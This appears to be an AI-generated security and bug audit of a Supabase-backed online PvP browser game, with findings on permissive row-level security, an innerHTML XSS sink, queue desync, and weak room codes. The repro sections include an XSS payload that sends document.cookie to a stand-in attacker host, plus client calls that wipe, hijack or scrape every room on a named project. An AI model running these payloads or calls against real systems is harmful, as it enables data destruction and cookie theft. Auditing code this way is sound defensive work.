---
severity: P0
category: security
anchor_symbol: pvp_rooms_update
current_line_hint: ~43
file: supabase/migrations/001_online_pvp.sql
agents: [pvp-concurrency-hunter]
fingerprint: a1f5cf704e77
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Permissive RLS (`using (true)` for UPDATE/DELETE/INSERT) lets any anon client clobber/wipe any PvP room

**Evidence**:
```sql
-- supabase/migrations/001_online_pvp.sql L29-54  — ALL operations open to anon
-- "MVP: permissive policies for anon + authenticated clients using the anon key.
--  Tighten later (e.g. restrict updates to room owner, RPC join-by-code only)."
create policy "pvp_rooms_update" on public.pvp_rooms for update
  to anon, authenticated using (true) with check (true);
create policy "pvp_rooms_delete" on public.pvp_rooms for delete
  to anon, authenticated using (true);
create policy "pvp_rooms_insert" on public.pvp_rooms for insert
  to anon, authenticated with check (true);
```

**Repro**: With the publishable key from `online-config.js` (`sb_publishable_vLGEm7Ha50A9IhdnKdCoFA_znkPGI6i`) and `https://ynblrcxpubfevqgieuuo.supabase.co`, any third party can: `await client.from('pvp_rooms').delete().neq('id', '00000000-0000-0000-0000-000000000000')` — wipes every active match. Or `update().eq('id', target_room_id).set({data: { ...attacker_blob }})` — hijacks a match mid-draft to inject a chosen team for the opponent. Or `select('code, data')` — scrape every live game's draft picks.

**Blast radius**: Catastrophic for the online-PvP feature. The 002 migration added an atomic `try_join_pvp_room` RPC to fix one TOCTOU, but the underlying UPDATE policy remained wide open — every other write path (`pushData`'s `update().eq('id', roomId)` at L492) trusts the client and there is zero server-side guarantee that the writing client owns the room. This is exactly the "fix later" note that never got applied. All concurrency analysis below assumes a well-behaved peer; under the current RLS, a hostile peer with the anon key can override any of those guarantees by writing directly to the row.

**Fix sketch**: At minimum, route every write through SECURITY DEFINER RPCs that check a per-room caller token (host generates a UUID on createRoom, embedded in `data.host_token` & returned only to host; guest receives a different token via `try_join_pvp_room`). UPDATE policy then becomes `using ((data->>'host_token' = current_setting('request.header.x-pbs-token', true)) OR (data->>'guest_token' = current_setting('request.header.x-pbs-token', true)))`. DELETE policy should be host-only or RPC-only. SELECT can stay permissive (so spectators / rejoins work) but redact draft picks until phase='battle' if competitive integrity matters.

**Verification**: From a fresh browser, with no room joined, attempt `client.from('pvp_rooms').update({ data: { hostile: true } }).eq('id', '<live-room-id>')` — must return `error: row-level security policy violated` instead of silently succeeding.

---
severity: P0
category: security
anchor_symbol: applyBattleLogHtml
current_line_hint: ~223
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 965f251a0c94
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `applyBattleLogHtml` injects raw `battle_log_html` from the room row into the DOM — XSS sink fed by world-writable Supabase row

**Evidence**:
```js
// online-pvp.js L214-231  — capture host's #battle-log innerHTML, push as raw string,
// guest re-injects with .innerHTML (no sanitization, no DOMPurify, nothing).
function captureBattleLogHtml() {
    const el = global.document && global.document.getElementById('battle-log');
    return el ? el.innerHTML : '';
}
function applyBattleLogHtml(html) {
    const el = global.document.getElementById('battle-log');
    if (!el) return;
    el.innerHTML = typeof html === 'string' ? html : '';  // <-- SINK
}
// L629, L657, L708, L722 push battle_log_html; L757, L782 apply it on the guest.
```

**Repro**: Combined with the open RLS finding above: attacker calls `client.from('pvp_rooms').update({ data: { ...prev, battle_log_html: '<img src=x onerror="fetch(`https://attacker/?c=`+document.cookie)">', seq: prev.seq+1 } }).eq('id', live_room_id)`. The realtime UPDATE arrives at every subscribed peer (host + guest), passes the `seq > lastRemoteSeq` gate, reaches `onOnlineRoomData` → `guestApplyBattleBlob` (L782) or `guestApplyBattleStart` (L757), which calls `applyBattleLogHtml(d.battle_log_html)` → arbitrary script executes in the victim's origin. Steals localStorage (including the Supabase session if ever upgraded to auth) and the player's display name; can render fake "you lost" screens; can pivot to the rest of `battle.html` globals.

**Blast radius**: Every live PvP match. Even without the open-RLS angle, any peer is implicitly trusted: a malicious *host* can already feed the guest arbitrary HTML on every turn. `logMsg` at battle.html:12972 does `div.innerHTML = processedMsg` where `processedMsg` interpolates `mon.name` into both attribute and text contexts (`data-mn="${enc}"` is escaped, but the textContent slot `>${moveName}</span>` is not — and `mon.name` for a Pokemon comes from team builds that flow through the draft pool, so any custom team upload with a crafted `name` field plants a payload in the host's log, which then ships to the guest verbatim).

**Fix sketch**: Either (a) don't transmit HTML — send the structured log entries (array of `{ msg, type, mon, move }`) and let each client format with the same `logMsg` template-safe path; or (b) hard-sanitize through DOMPurify before `innerHTML=` (allow only `<div class="log-…"><span class="…" data-mn="…">…</span></div>` — no scripts, no `on*` attributes, no `javascript:`). (a) is the architecturally right answer because it also eliminates the size-of-HTML bloat in `data.battle_log_html`.

**Verification**: New integration test: simulate a remote row with `battle_log_html: '<img src=x onerror="window.__xssFired=true">'`, run through `guestApplyBattleBlob`, assert `window.__xssFired === undefined`. Plus a unit test asserting `applyBattleLogHtml` strips `<script>`, `on*` attributes, and `javascript:` URLs.

---
severity: P1
category: bug
anchor_symbol: pushDataQueue
current_line_hint: ~463
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 28d225daff16
confidence: high
status: open
---

**Title**: `pushData` queue keeps advancing after a write fails — `_pushDataImpl` errors are swallowed to `console.warn`, leaving local state diverged from Supabase

**Evidence**:
```js
// online-pvp.js L463-494
pushData(patch, existingData) {
    const sb = getClient();
    if (!sb || !roomId) return Promise.resolve();
    const op = pushDataQueue.then(() => this._pushDataImpl(patch, existingData));
    pushDataQueue = op.catch((e) => {
        console.warn('[OnlinePvP] pushData queue', e);     // <-- swallows, queue advances
    });
    return op;                                              // caller can await rejection,
                                                            // but no caller actually catches.
},
async _pushDataImpl(patch, existingData) {
    // ...
    const { error: upErr } = await sb.from('pvp_rooms')
        .update({ data, updated_at: new Date().toISOString() }).eq('id', roomId);
    if (upErr) console.warn('[OnlinePvP] pushData update failed', upErr);  // <-- not thrown
},
```

**Repro**: Pull the network on the host mid-battle. `pushData({ battle, ... }, prev)` at L547/L571/L630 await the rejection (or in the upErr case, it returns normally because the `update` error is only console.warned), so callers don't see the failure. The guest never receives the seq bump, the host's local `state` reflects "p1 picked move", and the next turn proceeds locally — desync. Worse: if `_pushDataImpl` throws (e.g., the select at L478 fails), the queue's `.catch()` healing means the *next* `pushData` proceeds as if nothing happened, with no retry of the lost write.

**Blast radius**: All host-authoritative updates: draft progression (L399), draft deadline (L406, L410), p1/p2 pick submission (L547, L571), turn resolution (L630), end-of-round wins (L654), battle start (L716). The serialization is correct (queue preserves order), but the failure-handling contract is broken in two ways: (1) `update` errors at L493 are not thrown, so the queued op resolves "successfully" with bad data, and (2) `select` errors at L481-485 are thrown but only `console.warn`ed by the queue, with no upstream signal — `pushData(...)`'s return value rejects but every callsite uses `await this.pushData(...)` without a `try/catch`, so the rejection bubbles all the way up to the function that called `handlePvPPlayTurn`/`_hostRunResolution`, where it's *also* not caught (those functions don't try-wrap pushData), and ultimately reaches the user's click handler with an unhandled rejection.

**Fix sketch**: (a) Throw on `upErr` at L493 (`if (upErr) throw upErr`) so the queue knows the write actually failed. (b) Add a `pushDataFailed` callback on the OnlineBattle object that signals "we lost sync — UI should show a 'reconnecting' banner". (c) On select/update failure, retry once with exponential backoff before declaring the write lost. (d) Every call site that needs durable confirmation (turn submission, end of round) should `try/catch` the await and surface an inline error to the player ("network hiccup — your move was not sent").

**Verification**: Add a test that injects an `update` error response and asserts: (1) `pushData(patch).then(...).catch(handler)` reaches `handler`, (2) a follow-up `pushData(patch2)` still runs (queue doesn't stall — important), and (3) a `pushDataFailed` event fires with both patches' info.

---
severity: P1
category: bug
anchor_symbol: remoteRowQueue
current_line_hint: ~496
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 564feb239c3e
confidence: high
status: open
---

**Title**: `remoteRowQueue` has no timeout — a hung `onOnlineRoomData` (e.g., a UI promise that never resolves) freezes ALL future remote updates

**Evidence**:
```js
// online-pvp.js L496-508
_onRemoteRow(newRow) {
    if (!newRow) return;
    remoteRowQueue = remoteRowQueue
        .then(async () => {
            const d = newRow.data || {};
            if ((d.seq || 0) <= lastRemoteSeq) return;
            lastRemoteSeq = d.seq || lastRemoteSeq + 1;
            if (typeof global.onOnlineRoomData === 'function') {
                await Promise.resolve(global.onOnlineRoomData(d, { role, roomCode }));
                //          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                //          unbounded — onOnlineRoomData calls startBattle() at L14711,
                //          guestApplyBattleStart() at L14716, guestApplyBattleBlob()
                //          at L14728, consumeRemoteForHost() at L14724 — any UI
                //          promise that never resolves locks the whole channel.
            }
        })
        .catch((e) => console.warn('[OnlinePvP] onOnlineRoomData', e));
},
```

**Repro**: In `guestApplyBattleStart` (L743), the function calls `global.AudioSystem.startNewBattle()` which is wrapped in try/catch — but what about `global.updateUI()` at L768 or `global.applyBattleLogDockClass()` at L773? If any of those `await`s an animation promise or a modal close that depends on user interaction, the queue chain blocks until that promise settles. From that moment on, every future `_onRemoteRow` (every pushData echo, every opponent move) sits in the queue waiting. The realtime subscription is still receiving events, but they pile up behind a stuck `await`. The host has no signal that the guest is stuck. The integration test at `tests/integration/pvp-stub.test.js:75-90` validates serialization but doesn't exercise the hang-recovery path.

**Blast radius**: The whole live-sync layer freezes on a single bad handler invocation. The user sees their input go through (local state changes), but the opponent's responses never appear. Symptom: "the game froze, my opponent's screen says it's their turn but they say it's mine."

**Fix sketch**: Race the handler against a timeout: `await Promise.race([handler, new Promise((_, rej) => setTimeout(() => rej(new Error('onOnlineRoomData timeout')), 30_000))])`. On timeout, log loudly, possibly tear down the channel and reconnect (the `_subscribe` path is idempotent — `removeChannel` then re-create). Alternatively, decouple the queue from the handler: the queue's job is to enforce sequence ordering, not to wait on UI; once the seq check passes, fire-and-forget the handler call with its own error boundary, so a hung handler never blocks subsequent seq updates.

**Verification**: Add a test that mocks `global.onOnlineRoomData = () => new Promise(() => {})` (never resolves), call `_onRemoteRow({ data: { seq: 1 } })`, then `_onRemoteRow({ data: { seq: 2 } })`, then wait 35s. Assert that the queue did *not* block the seq:2 row's handler (or that a reconnect was triggered).

---
severity: P1
category: bug
anchor_symbol: lastRemoteSeq
current_line_hint: ~501
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: ff27549bd4fe
confidence: high
status: open
---

**Title**: `lastRemoteSeq` is updated *before* the remote handler runs — a thrown handler still bumps the watermark, so the failed update is permanently skipped

**Evidence**:
```js
// online-pvp.js L498-507
remoteRowQueue = remoteRowQueue
    .then(async () => {
        const d = newRow.data || {};
        if ((d.seq || 0) <= lastRemoteSeq) return;          // gate
        lastRemoteSeq = d.seq || lastRemoteSeq + 1;          // bump BEFORE await
        if (typeof global.onOnlineRoomData === 'function') {
            await Promise.resolve(global.onOnlineRoomData(d, { role, roomCode }));
            // ^ if this throws, lastRemoteSeq is already advanced;
            //   the same seq will never re-enter the handler.
        }
    })
    .catch((e) => console.warn('[OnlinePvP] onOnlineRoomData', e));
```

**Repro**: Force `onOnlineRoomData` to throw for a specific seq (e.g., guest receives `battle_start_blob` with a malformed JSON — `applyBattleSnapshot` returns false at L755 but earlier in the chain a `JSON.parse` could throw). `lastRemoteSeq` is now at that seq. The next legitimate update at seq+1 passes the gate fine, but the broken seq's data is *lost* — the guest's local state never reflects whatever info the broken row carried (e.g., new wins count, host display name update at L748-753). Symptom: scoreboard shows stale data even though both peers are connected.

**Blast radius**: Every conditional branch inside `onOnlineRoomData` (battle.html:14681-14760). Some are idempotent (later rows carry the same data, so the lost update is recovered when the next seq arrives — e.g., `host_display_name` is re-broadcast on every push). Others are not: `d.battle.state_blob` only arrives on resolved turns; a lost resolved-turn seq leaves the guest stranded a turn behind, and the host won't re-broadcast that exact seq.

**Fix sketch**: Move the `lastRemoteSeq` bump *after* a successful handler completion. Use a temporary "in-flight" marker if you need to deduplicate within a single tick. Pattern:
```js
remoteRowQueue = remoteRowQueue.then(async () => {
    const incoming = d.seq || 0;
    if (incoming <= lastRemoteSeq) return;
    try { await Promise.resolve(global.onOnlineRoomData(d, ...)); }
    catch (e) { console.warn(...); /* do NOT advance seq */ return; }
    lastRemoteSeq = incoming;   // only on success
});
```
Combined with the timeout from the previous finding, this stays robust against hung handlers (timeout → seq does not advance → next row at same seq is allowed to retry).

**Verification**: Test: inject one row at seq=5 where the handler throws, then a row at seq=6. Assert: after both, `lastRemoteSeq === 5` (or the system retried seq=5), not 6.

---
severity: P1
category: security
anchor_symbol: pvp_rooms_select
current_line_hint: ~31
file: supabase/migrations/001_online_pvp.sql
agents: [pvp-concurrency-hunter]
fingerprint: c6b9e9e968bd
confidence: high
status: open
---

**Title**: `pvp_rooms` SELECT policy is `using (true)` — anyone with the public key can scrape every live match's full draft + battle state

**Evidence**:
```sql
-- supabase/migrations/001_online_pvp.sql L31-35
drop policy if exists "pvp_rooms_select" on public.pvp_rooms;
create policy "pvp_rooms_select"
  on public.pvp_rooms for select
  to anon, authenticated
  using (true);
```

**Repro**: With the publishable key (which is hardcoded in `online-config.js` and shipped to every browser), an attacker runs `client.from('pvp_rooms').select('code, data').range(0, 999)` and gets every live room's code, draft picks (p1/p2 pool, p1/p2 draft), p1_pick/p2_pick (the move each player just selected), and `battle_log_html` (the full battle commentary). Subscribing to `postgres_changes` on `pvp_rooms` gives realtime spectator access to every match without joining.

**Blast radius**: Competitive integrity for ranked-style play (other player can see what you drafted before you commit your pick). Privacy: display names are tied to rooms; an attacker can map "Trainer Alice" to "Trainer Bob" across many matches. Codes are leaked, so anyone watching can join as the second player into a room that hasn't filled yet (though the atomic `try_join_pvp_room` RPC ensures only one guest can actually claim it).

**Fix sketch**: Restrict SELECT to participants. Two approaches: (a) require a token-bearing RPC (`get_room_for_participant(p_room_id, p_token)`) that returns the row only if `p_token` matches `data->>'host_token'` or `data->>'guest_token'`; client-side `select` is denied. (b) Keep SELECT permissive on the `code` column only (so join-by-code works) and gate the `data` column with a column-level grant — but PostgREST + jsonb makes this awkward. (a) is cleaner.

**Verification**: From a non-participant client, `select * from pvp_rooms` must return 0 rows (or only rows where the requesting token matches).

---
severity: P2
category: security
anchor_symbol: setDisplayName
current_line_hint: ~812
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 89314480e594
confidence: medium
status: open
---

**Title**: Display names accepted up to 24 chars with zero sanitization — flow into innerText today, but one careless innerHTML downstream becomes XSS

**Evidence**:
```js
// online-pvp.js L812-814
setDisplayName(n) {
    global.localStorage.setItem(STORAGE_KEY, String(n || '').trim().slice(0, 24) || 'Trainer');
}
// L723 host pushes the unsanitized name back to room data:
host_display_name: nPrev.host_display_name || (global.localStorage && global.localStorage.getItem('pbs_online_display_name')) || 'Host',
// battle.html L14695-14696 — guest stores remote name on globals
if (d.host_display_name) window.__onlineHostName = d.host_display_name;
if (d.guest_display_name) window.__onlineGuestName = d.guest_display_name;
// battle.html L16285-16286, L791-794 — currently safe (innerText), but each new call site is a foot-gun
if (title.includes('VICTORY')) document.getElementById('end-desc').innerText = `${p1n} won this round!`;
```

**Repro**: Set localStorage `pbs_online_display_name = '<img src=x onerror=alert(1)>'.slice(0, 24)` → `'<img src=x onerror=ale'` (truncated but the `<img` still parses). Currently only `innerText` consumers exist, so the live attack surface is zero. But there are 6+ globals (`__onlineHostName`, `__onlineGuestName`, etc.) holding raw player-controlled strings, and any future panel that does `el.innerHTML = ${name} won!` opens the door.

**Blast radius**: Latent — depends on future innerHTML callsites touching display names. Compounded by the open-RLS finding above: an attacker doesn't even need to log in; they can directly write `host_display_name` to any live room via the open UPDATE policy.

**Fix sketch**: In `setDisplayName`, strip HTML-sensitive chars: `String(n || '').trim().replace(/[<>"'&]/g, '').slice(0, 24) || 'Trainer'`. Reject control characters too. Belt-and-suspenders: every consumer should use textContent/innerText only. Add an ESLint rule (or a grep test in CI) that fails if a line both touches `__onlineHostName`/`__onlineGuestName` and contains `innerHTML`.

**Verification**: Set the localStorage key to `'<script>x</script>'`, start a match, eyeball the score panel — it should display the literal characters (or empty), not execute.

---
severity: P2
category: refactor
anchor_symbol: deepClone
current_line_hint: ~67
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: f399b81a21b5
confidence: medium
status: open
---

**Title**: `deepClone` falls back to `JSON.parse(JSON.stringify(...))` — silently drops Set/Map/Date/undefined/circular refs across the entire snapshot pipeline

**Evidence**:
```js
// online-pvp.js L67-69
function deepClone(o) {
    return typeof structuredClone === 'function' ? structuredClone(o) : JSON.parse(JSON.stringify(o));
}
// Called 11x across the file, on state.pSide/fSide/playerParty/foeParty/p1GimmickIntent
// /p2GimmickIntent/draftGrades/mechanics — i.e. the entire snapshot.
// exportBattleSnapshot at L110-161 already special-cases revealedFoe (Set → Array) at L111-113,
// proving the author knows JSON drops Sets, but only one site was patched.
```

**Repro**: If a future state addition stores `state.fSide.boosts = new Map([['atk', 1]])`, `deepClone(state.fSide)` returns `{ boosts: {} }` under JSON fallback (Map serializes to `{}`) or a real Map under `structuredClone`. Cross-browser test fleet split: Chrome ≥98 gets structuredClone, older WebViews fall through to JSON. Behavior diverges silently. Same goes for `Date` objects (become ISO strings under JSON, stay Date under structuredClone), `undefined` (key dropped under JSON, preserved under structuredClone), and circular refs (JSON throws, structuredClone preserves).

**Blast radius**: Latent — no current state object known to use Set/Map/Date/undefined in the cloned regions. But the `revealedFoe` special-case shows this category of bug already bit once; any future contributor adding a `Map<MoveId, …>` to `pSide` or a `Date` for status-cure-timestamp creates a cross-environment drift bug that only manifests in older Safari/Edge.

**Fix sketch**: (a) Drop the JSON fallback entirely — `structuredClone` has been Safari ≥15.4 / Chrome ≥98 / Firefox ≥94 since early 2022, which is the same browser floor the project targets. (b) Or, replace with a project-specific safe-clone that explicitly handles Set/Map/Date (mirroring `exportBattleSnapshot`'s revealedFoe pattern for all known cases).

**Verification**: Add a unit test: build a state object with `pSide.foo = new Set([1, 2])`, `pSide.bar = new Date('2025-01-01')`, run through `exportBattleSnapshot` → `applyBattleSnapshot`, assert the round-trip preserves both. Today this fails on the JSON path.

---
severity: P2
category: refactor
anchor_symbol: global_state_coupling
current_line_hint: ~447
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 8a35ede06e36
confidence: high
status: open
---

**Title**: 36 references to 18 distinct `global.__*` variables across `online-pvp.js` — the PvP module mutates host-side state through ad-hoc globals instead of a single observable

**Evidence**:
```js
// 18 distinct globals, cataloged from grep -nE 'global\.__\w+' online-pvp.js:
// __PBS_SUPABASE_URL (L22, L38)              // config
// __PBS_SUPABASE_ANON_KEY (L23, L38)         // config
// __onlineMatchTimerPreset (L99, L288, L403)
// __onlineMatchFormat (L103, L455, L753)
// __hostOnlineBattleStarted (L447) + __onlineHostDraftDeadlinePrimed (L451)
// __guestLastResolved (L448) + __guestBattleStartApplied (L449)
// __onlineGuestJoined (L450) + __onlineGuestRematchApplied (L456)
// __onlineP1Wins / __onlineP2Wins / __onlineRoundNumber (L452-454, L650-652, L750-752)
// __onlineHostName / __onlineGuestName (L457-458, L748-749, L791-792)
// __onlineBattleDeadlineFiring (L671, L679, L699)
// __runLockedPvPTurnResolution (L604-605)
// __onlinePvpConfigured (L818) // export
```

**Repro**: `grep -nE 'global\.__\w+' online-pvp.js | wc -l` → 36. Then `grep -nE '__online' battle.html | wc -l` for the consumer side (likely >50). Every global is a synchronization channel between the PvP module and the main battle code; there's no schema, no `defineProperty` reactivity, no central reset. The `dispose` method at L446-460 enumerates the resets manually — every new global added to the module must remember to wire into dispose's `catch(e){}` block, or stale state leaks across rooms.

**Blast radius**: Maintenance & correctness. Real symptoms: a new `__onlineFoo` flag added without a `dispose` reset leaves the second match in the same browser session in a half-stuck state. The `try { ... } catch (e) {}` at L460 even silences the AssertionError if you typo a global name during a reset.

**Fix sketch**: Wrap all PvP-related cross-module state in a single `global.OnlineBattle.session = { hostName: null, guestName: null, p1Wins: 0, ... }` object. Provide a `resetSession()` method that the host calls on `dispose` and on each rematch. Consumers in `battle.html` read `OnlineBattle.session.hostName` instead of `__onlineHostName`. Migration is mechanical (sed/codemod). Optional: make the object a Proxy that logs writes in `__DEBUG_PVP=true` mode to catch which global is mutating when.

**Verification**: After refactor, `grep -nE 'global\.__online\w+|global\.__host\w+|global\.__guest\w+' online-pvp.js | wc -l` should drop to 0 (or only the config keys). dispose's manual reset block goes away in favor of `this.session = freshSession()`.

---
severity: P3
category: bug
anchor_symbol: randomCode
current_line_hint: ~44
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: aee012742c28
confidence: medium
status: open
---

**Title**: Room codes use `Math.random()` over 32 chars × 6 positions — 30 bits, birthday collision at ~30K concurrent rooms, retry-on-23505 saves correctness but not enumeration cost

**Evidence**:
```js
// online-pvp.js L44-49
function randomCode() {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';   // 32 chars (no I/O/1/0 → ambiguous-safe)
    let s = '';
    for (let i = 0; i < 6; i++) s += chars[Math.floor(Math.random() * chars.length)];
    return s;
}
// L341-351 retry loop tolerates 8 collisions before giving up.
```

**Repro**: 32^6 = ~1.07 billion codes; birthday paradox says collision probability hits 50% at ~37K codes simultaneously in flight. With 8 retries the practical ceiling is much higher (each attempt has 1 - codes_in_use/1e9 ≈ 1 success prob even at 1M live rooms), so this is fine *for correctness*. The real concern is enumeration: an attacker who can call `fetchRoomByCode(code)` (no rate limit visible) can brute-force the ~1B codespace. At 10 lookups/sec from a single client and the open SELECT policy, finding a specific 6-char code takes a year on average; finding *any* live room takes seconds (~1000 rooms / 1B = ~1M attempts = 27 hours). With the open RLS, the attacker can short-circuit by `select('code') from pvp_rooms` instead — making the codespace strength irrelevant.

**Blast radius**: Defensive. Under tightened RLS (see the P0/P1 RLS findings), the code becomes the secret that gates joining; at that point, 30-bit entropy is shaky for a feature meant to defend against opportunistic eavesdroppers. Realistically, room codes need to be share-friendly (length 6, no ambiguous chars) so the 30 bits cap is by design.

**Fix sketch**: For correctness alone, no change needed (the retry on 23505 handles collisions). For privacy of in-progress matches: combine the code with an opaque per-room access token returned from `createRoom` and required as a header on every read (see the P1 SELECT-RLS finding's RPC design). The code stays human-shareable; the token is the real secret.

**Verification**: Existing integration test `tests/integration/pvp-stub.test.js:101-111` samples 1000 codes and asserts ≥990 unique — this validates collision rate, not unguessability.

---
severity: P3
category: refactor
anchor_symbol: createRoom_23505
current_line_hint: ~349
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 28d225daff16_2
confidence: low
status: open
---

**Title**: `createRoom` hardcodes Postgres SQLSTATE `23505` for unique-violation detection — defensive `.includes('duplicate')` fallback exists but the magic number is undocumented

**Evidence**:
```js
// online-pvp.js L341-351
for (let attempt = 0; attempt < 8; attempt++) {
    roomCode = randomCode();
    const ins = await sb.from('pvp_rooms').insert({ code: roomCode, data }).select('id').single();
    if (!ins.error) { row = ins.data; break; }
    lastErr = ins.error;
    const dup = ins.error && (ins.error.code === '23505' || String(ins.error.message || '').toLowerCase().includes('duplicate'));
    //                                          ^^^^^^^ Postgres SQLSTATE for "unique_violation"
    if (!dup) throw ins.error;
}
```

**Repro**: Cosmetic. The fallback `.includes('duplicate')` covers the case where Supabase's error mapping changes (`error.code` becoming `'PGRST116'` or similar). Brittle to copy-paste into other tables (e.g., the gauntlet_leaderboard insert pattern in migration 002).

**Blast radius**: One site. No active bug.

**Fix sketch**: Add a constant `const PG_UNIQUE_VIOLATION = '23505';` at the top of the module with a one-line comment linking the Postgres docs. Or factor a helper `function isUniqueViolation(err)` so future callers (gauntlet leaderboard insert, etc.) share the same check.

**Verification**: Mechanical.

